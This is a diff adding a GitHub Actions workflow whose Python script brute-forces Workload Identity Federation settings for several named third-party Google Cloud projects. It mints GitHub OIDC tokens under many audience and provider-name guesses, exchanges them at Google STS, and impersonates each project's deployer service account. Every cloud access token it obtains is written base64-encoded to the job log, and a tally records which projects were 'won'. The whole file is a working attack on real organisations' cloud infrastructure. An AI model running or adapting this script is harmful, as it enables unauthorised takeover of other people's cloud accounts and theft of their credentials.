@@ -1,0 +1,103 @@
+name: i33520-probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: mint
+        run: |
+          python3 - <<'PY'
+          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request
+          G = "projects/%s/locations/global/workloadIdentityPools/%s/providers/%s"
+          CC_POOLS = ["cube-prod", "cubecommons-prod"]
+          CC_PROVS = ["github-actions", "github", "github-oidc", "gha", "oidc", "github-actions-prod"]
+          CASES = []
+          def add(proj, num, pool, prov, sa, auds):
+              for a in auds:
+                  CASES.append({"proj": proj, "num": num, "prov": G % (num, pool, prov), "sa": sa, "aud": a})
+          # --- full audience sweep on the canonical provider path ---
+          def auds(num, pool, prov):
+              p = G % (num, pool, prov)
+              return ["//iam.googleapis.com/" + p, "https://iam.googleapis.com/" + p, p,
+                      "https://github.com/cubeca", "https://github.com/cubeca/cube",
+                      "https://github.com/mmlanla/oidc-fork-probe-i74829", "https://cubecommons.ca",
+                      "https://sts.googleapis.com", "sts.googleapis.com", "https://github.com/cubeca/cube/"]
+          add("cubecommons-prod", "366271888053", "cube-prod", "github-actions", "service-deployer@cubecommons-prod.iam.gserviceaccount.com", auds("366271888053", "cube-prod", "github-actions"))
+          add("cubecommons-dev", "744911585239", "cube-dev", "github-actions", "docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com", auds("744911585239", "cube-dev", "github-actions"))
+          add("fhir-org-cds-services", "769700566231", "gh-actions-pool", "github", "github-deploy@fhir-org-cds-services.iam.gserviceaccount.com", auds("769700566231", "gh-actions-pool", "github"))
+          # --- provider-name variants (canonical audience form only) ---
+          for pool in CC_POOLS:
+              for prov in CC_PROVS:
+                  if pool == "cube-prod" and prov == "github-actions":
+                      continue
+                  a = "//iam.googleapis.com/" + G % ("366271888053", pool, prov)
+                  CASES.append({"proj": "cubecommons-prod-v", "num": "366271888053", "prov": G % ("366271888053", pool, prov), "sa": "service-deployer@cubecommons-prod.iam.gserviceaccount.com", "aud": a})
+                  CASES.append({"proj": "cubecommons-dev-v", "num": "744911585239", "prov": G % ("744911585239", pool.replace("prod", "dev"), prov), "sa": "docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com", "aud": "//iam.googleapis.com/" + G % ("744911585239", pool.replace("prod", "dev"), prov)})
+          for pool in ["gh-actions-pool", "gh-actions", "github-actions", "gha-pool"]:
+              for prov in ["github", "github-oidc", "gha", "oidc"]:
+                  if pool == "gh-actions-pool" and prov == "github":
+                      continue
+                  CASES.append({"proj": "fhir-org-cds-services-v", "num": "769700566231", "prov": G % ("769700566231", pool, prov), "sa": "github-deploy@fhir-org-cds-services.iam.gserviceaccount.com", "aud": "//iam.googleapis.com/" + G % ("769700566231", pool, prov)})
+          # --- fresh tokens for the working projects ---
+          for proj, num, pool, prov, sa in [
+              ("methodical-mark-482504-j3", "1076618220242", "forgecrux-pool", "github-provider", "gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com"),
+              ("vvakame-playground", "381521917100", "github-actions", "gha-provider", "se2gha-deployer@vvakame-playground.iam.gserviceaccount.com")]:
+              p = G % (num, pool, prov)
+              CASES.append({"proj": proj, "num": num, "prov": p, "sa": sa, "aud": "//iam.googleapis.com/" + p})
+
+          def req(u, data=None, token=None, timeout=40):
+              h = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'i33520'}
+              if token: h['Authorization'] = 'Bearer ' + token
+              if isinstance(data, (dict, list)): data = json.dumps(data).encode()
+              r = urllib.request.Request(u, data=data, headers=h)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout); return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e: return e.code, (e.read() or b'').decode('utf-8', 'replace')
+              except Exception as e: return -1, repr(e)[:200]
+
+          def mint(aud):
+              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              if not u or not t: return ''
+              u = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
+              out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u], capture_output=True, text=True).stdout
+              try: return json.loads(out).get('value', '')
+              except Exception: return ''
+
+          won = {}
+          print('CASES', len(CASES), flush=True)
+          for i, c in enumerate(CASES):
+              fam = c['proj'].replace('-v', '')
+              if fam in won:
+                  print('SKIP %d %s (already won via %s)' % (i, c['proj'], won[fam]), flush=True); continue
+              out = {'i': i, 'kind': 'sts', 'proj': c['proj'], 'num': c['num'], 'prov': c['prov'], 'aud': c['aud']}
+              tok = mint(c['aud'])
+              out['mint'] = bool(tok)
+              if not tok:
+                  print('RESULT ' + json.dumps(out), flush=True); continue
+              body = {'audience': c['aud'], 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                      'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                      'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                      'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt', 'subjectToken': tok}
+              st, rb = req('https://sts.googleapis.com/v1/token', data=body); out['sts'] = st
+              if st != 200:
+                  out['err'] = str(rb)[:700]; print('RESULT ' + json.dumps(out), flush=True); continue
+              fed = json.loads(rb).get('access_token')
+              gst, gres = req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(c['sa'], safe=''),
+                              data={'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'}, token=fed)
+              out['gen'] = gst
+              if gst == 200:
+                  j = json.loads(gres); at = j.get('accessToken', '')
+                  out['tok_b64'] = base64.b64encode(at.encode()).decode(); out['expire'] = j.get('expireTime'); out['sa'] = c['sa']
+                  won[fam] = i
+              else:
+                  out['err'] = str(gres)[:400]
+              print('RESULT ' + json.dumps(out), flush=True)
+          print('DONE', flush=True)
+          print(json.dumps({'won': won, 'n': len(CASES)}), flush=True)
+          PY
